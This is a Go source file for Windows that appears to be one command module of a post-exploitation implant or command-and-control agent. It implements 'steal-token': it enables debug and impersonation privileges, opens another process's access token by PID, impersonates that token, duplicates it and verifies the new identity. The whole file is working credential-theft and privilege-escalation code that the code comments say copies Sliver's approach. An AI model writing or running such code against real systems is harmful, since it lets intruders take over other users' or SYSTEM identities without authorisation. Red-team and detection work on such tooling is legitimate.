//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"strings"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

var (
	advapi32                = windows.NewLazySystemDLL("advapi32.dll")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf        = advapi32.NewProc("RevertToSelf")
	procLookupPrivilegeValue = advapi32.NewProc("LookupPrivilegeValueW")
	procAdjustTokenPrivileges = advapi32.NewProc("AdjustTokenPrivileges")
)

const (
	SE_PRIVILEGE_ENABLED      = 0x00000002
	SE_DEBUG_NAME             = "SeDebugPrivilege"
	SE_IMPERSONATE_NAME       = "SeImpersonatePrivilege"
	SE_ASSIGNPRIMARYTOKEN_NAME = "SeAssignPrimaryTokenPrivilege"
)

type LUID struct {
	LowPart  uint32
	HighPart int32
}

type LUID_AND_ATTRIBUTES struct {
	Luid       LUID
	Attributes uint32
}

type TOKEN_PRIVILEGES struct {
	PrivilegeCount uint32
	Privileges     [1]LUID_AND_ATTRIBUTES
}

func enablePrivilege(privilegeName string, debugLog *strings.Builder) error {
	var hToken windows.Token
	err := windows.OpenProcessToken(windows.CurrentProcess(), windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY, &hToken)
	if err != nil {
		debugLog.WriteString(fmt.Sprintf("[DEBUG] Failed to open process token for privilege adjustment: %v\n", err))
		return err
	}
	defer hToken.Close()

	var luid LUID
	privName, _ := windows.UTF16PtrFromString(privilegeName)
	ret, _, err := procLookupPrivilegeValue.Call(
		0,
		uintptr(unsafe.Pointer(privName)),
		uintptr(unsafe.Pointer(&luid)),
	)
	if ret == 0 {
		debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupPrivilegeValue failed for %s: %v\n", privilegeName, err))
		return fmt.Errorf("LookupPrivilegeValue failed for %s: %v", privilegeName, err)
	}

	tp := TOKEN_PRIVILEGES{
		PrivilegeCount: 1,
		Privileges: [1]LUID_AND_ATTRIBUTES{
			{
				Luid:       luid,
				Attributes: SE_PRIVILEGE_ENABLED,
			},
		},
	}

	ret, _, err = procAdjustTokenPrivileges.Call(
		uintptr(hToken),
		0,
		uintptr(unsafe.Pointer(&tp)),
		0,
		0,
		0,
	)
	if ret == 0 {
		debugLog.WriteString(fmt.Sprintf("[DEBUG] AdjustTokenPrivileges failed for %s: %v\n", privilegeName, err))
		return fmt.Errorf("AdjustTokenPrivileges failed for %s: %v", privilegeName, err)
	}

	// Check if the privilege was actually enabled
	lastErr := windows.GetLastError()
	if lastErr == windows.ERROR_NOT_ALL_ASSIGNED {
		debugLog.WriteString(fmt.Sprintf("[DEBUG] WARNING: %s not available or not held by token\n", privilegeName))
		return fmt.Errorf("%s not available", privilegeName)
	}

	debugLog.WriteString(fmt.Sprintf("[DEBUG] Successfully enabled %s\n", privilegeName))
	return nil
}

func enableTokenPrivileges(debugLog *strings.Builder) error {
	// Enable critical privileges for token manipulation
	privileges := []string{SE_DEBUG_NAME, SE_IMPERSONATE_NAME, SE_ASSIGNPRIMARYTOKEN_NAME}
	var enabledCount int
	for _, priv := range privileges {
		if err := enablePrivilege(priv, debugLog); err == nil {
			enabledCount++
		}
	}
	debugLog.WriteString(fmt.Sprintf("[DEBUG] Enabled %d out of %d privileges\n", enabledCount, len(privileges)))
	if enabledCount == 0 {
		debugLog.WriteString("[DEBUG] CRITICAL: No privileges could be enabled!\n")
	}
	return nil
}

type StealTokenCommand struct{}

func (c *StealTokenCommand) Name() string {
	return "steal-token"
}

func (c *StealTokenCommand) Description() string {
	return "Steal and impersonate a token from another process"
}

func (c *StealTokenCommand) Execute(task structs.Task) structs.CommandResult {
	var params struct {
		PID int `json:"pid"`
	}

	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	if params.PID == 0 {
		return structs.CommandResult{
			Output:    "PID is required",
			Status:    "error",
			Completed: true,
		}
	}

	output, err := stealToken(uint32(params.PID))
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to steal token: %v\n%s", err, output),
			Status:    "error",
			Completed: true,
		}
	}

	return structs.CommandResult{
		Output:    output,
		Status:    "completed",
		Completed: true,
	}
}

func (c *StealTokenCommand) ExecuteWithAgent(task structs.Task, agent *structs.Agent) structs.CommandResult {
	return c.Execute(task)
}

func stealToken(pid uint32) (string, error) {
	var debugLog strings.Builder
	var output string

	// Enable required privileges for token manipulation
	debugLog.WriteString("[DEBUG] Enabling token privileges...\n")
	enableTokenPrivileges(&debugLog)

	// Get original context before stealing
	debugLog.WriteString("[DEBUG] Getting current identity...\n")
	processHandle, err := windows.GetCurrentProcess()
	if err == nil {
		var processToken windows.Token
		err = windows.OpenProcessToken(processHandle, windows.TOKEN_QUERY, &processToken)
		if err == nil {
			defer processToken.Close()
			processUser, err := processToken.GetTokenUser()
			if err == nil {
				processUsername, processDomain, _, err := processUser.User.Sid.LookupAccount("")
				if err == nil {
					output += fmt.Sprintf("Old identity: %s\\%s\n", processDomain, processUsername)
					debugLog.WriteString(fmt.Sprintf("[DEBUG] Current identity: %s\\%s\n", processDomain, processUsername))
				}
			}
		}
	}

	// Open target process (exactly like Sliver's getPrimaryToken)
	debugLog.WriteString(fmt.Sprintf("[DEBUG] Calling OpenProcess for PID %d...\n", pid))
	hProcess, err := windows.OpenProcess(
		windows.PROCESS_QUERY_INFORMATION,
		true,
		pid,
	)
	if err != nil {
		return debugLog.String() + output, fmt.Errorf("OpenProcess failed: %v", err)
	}
	defer windows.CloseHandle(hProcess)
	debugLog.WriteString("[DEBUG] OpenProcess succeeded\n")

	// Open process token (exactly like Sliver: TOKEN_DUPLICATE|TOKEN_ASSIGN_PRIMARY|TOKEN_QUERY)
	debugLog.WriteString("[DEBUG] Calling OpenProcessToken...\n")
	debugLog.WriteString(fmt.Sprintf("[DEBUG] Requested access: TOKEN_DUPLICATE(0x%x) | TOKEN_ASSIGN_PRIMARY(0x%x) | TOKEN_QUERY(0x%x)\n", 
		windows.TOKEN_DUPLICATE, windows.TOKEN_ASSIGN_PRIMARY, windows.TOKEN_QUERY))
	
	var primaryToken windows.Token
	err = windows.OpenProcessToken(
		hProcess,
		windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY|windows.TOKEN_QUERY,
		&primaryToken,
	)
	if err != nil {
		// Get more detailed error information
		lastErr := windows.GetLastError()
		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken failed with error: %v (LastError: 0x%x)\n", err, lastErr))
		
		// Try with just TOKEN_QUERY to see if that works
		debugLog.WriteString("[DEBUG] Attempting OpenProcessToken with just TOKEN_QUERY...\n")
		var testToken windows.Token
		err2 := windows.OpenProcessToken(hProcess, windows.TOKEN_QUERY, &testToken)
		if err2 == nil {
			testToken.Close()
			debugLog.WriteString("[DEBUG] TOKEN_QUERY alone succeeded - privilege issue with TOKEN_DUPLICATE/TOKEN_ASSIGN_PRIMARY\n")
		} else {
			debugLog.WriteString(fmt.Sprintf("[DEBUG] TOKEN_QUERY alone also failed: %v\n", err2))
		}
		
		return debugLog.String() + output, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer primaryToken.Close()
	debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenProcessToken succeeded, token: 0x%x\n", primaryToken))

	// Get token user information for verification
	var targetUsername, targetDomain string
	var targetSid *windows.SID
	tokenUser, err := primaryToken.GetTokenUser()
	if err == nil {
		targetSid = tokenUser.User.Sid
		targetUsername, targetDomain, _, err = tokenUser.User.Sid.LookupAccount("")
		if err == nil {
			output += fmt.Sprintf("Target identity: %s\\%s (PID: %d)\n", targetDomain, targetUsername, pid)
			debugLog.WriteString(fmt.Sprintf("[DEBUG] Target identity: %s\\%s\n", targetDomain, targetUsername))
		}
	}

	// KEY: Impersonate the PRIMARY token FIRST (exactly like Sliver's impersonateProcess)
	debugLog.WriteString("[DEBUG] Calling ImpersonateLoggedOnUser on primary token...\n")
	ret, _, err := procImpersonateLoggedOnUser.Call(uintptr(primaryToken))
	if ret == 0 {
		return debugLog.String() + output, fmt.Errorf("ImpersonateLoggedOnUser failed: %v", err)
	}
	debugLog.WriteString("[DEBUG] ImpersonateLoggedOnUser succeeded\n")

	// NOW duplicate the token (like Sliver does AFTER impersonation)
	debugLog.WriteString("[DEBUG] Calling DuplicateTokenEx...\n")
	var newToken windows.Token
	err = windows.DuplicateTokenEx(
		primaryToken,
		windows.TOKEN_ALL_ACCESS,
		nil,
		windows.SecurityDelegation,
		windows.TokenPrimary,
		&newToken,
	)
	if err != nil {
		// Impersonation already succeeded, duplication is just for potential future use
		debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx failed: %v (keeping primary token impersonation)\n", err))
	} else {
		debugLog.WriteString(fmt.Sprintf("[DEBUG] DuplicateTokenEx succeeded, new token: 0x%x\n", newToken))
		// Keep newToken open - could be used for CreateProcessAsUser, etc.
		// For now just close it since we're already impersonated with the primary token
		newToken.Close()
	}

	// Verify impersonation by checking thread token
	debugLog.WriteString("[DEBUG] Verifying impersonation...\n")
	var hThreadToken windows.Token
	err = windows.OpenThreadToken(
		windows.CurrentThread(),
		windows.TOKEN_QUERY,
		true,
		&hThreadToken,
	)
	if err != nil {
		output += fmt.Sprintf("Warning: Cannot verify impersonation - OpenThreadToken failed: %v\n", err)
		debugLog.WriteString(fmt.Sprintf("[DEBUG] OpenThreadToken failed: %v\n", err))
		return debugLog.String() + output, nil
	}
	defer hThreadToken.Close()
	debugLog.WriteString("[DEBUG] OpenThreadToken succeeded\n")

	// Get the thread token user to verify
	threadTokenUser, err := hThreadToken.GetTokenUser()
	if err == nil {
		currentUsername, currentDomain, _, err := threadTokenUser.User.Sid.LookupAccount("")
		if err == nil {
			// Verify using SID comparison
			if targetSid != nil && targetSid.Equals(threadTokenUser.User.Sid) {
				output += fmt.Sprintf("Successfully impersonated %s\\%s", currentDomain, currentUsername)
				debugLog.WriteString(fmt.Sprintf("[DEBUG] Verified: %s\\%s (SIDs match)\n", currentDomain, currentUsername))
			} else {
				output += fmt.Sprintf("Successfully impersonated %s\\%s (but SID doesn't match expected target)", currentDomain, currentUsername)
				debugLog.WriteString(fmt.Sprintf("[DEBUG] Warning: Impersonated %s\\%s but SID mismatch!\n", currentDomain, currentUsername))
			}
		} else {
			output += "Successfully impersonated (verification lookup failed)"
			debugLog.WriteString(fmt.Sprintf("[DEBUG] LookupAccount failed: %v\n", err))
		}
	} else {
		output += "Successfully impersonated (verification GetTokenUser failed)"
		debugLog.WriteString(fmt.Sprintf("[DEBUG] GetTokenUser failed: %v\n", err))
	}

	return debugLog.String() + "\n" + output, nil
}
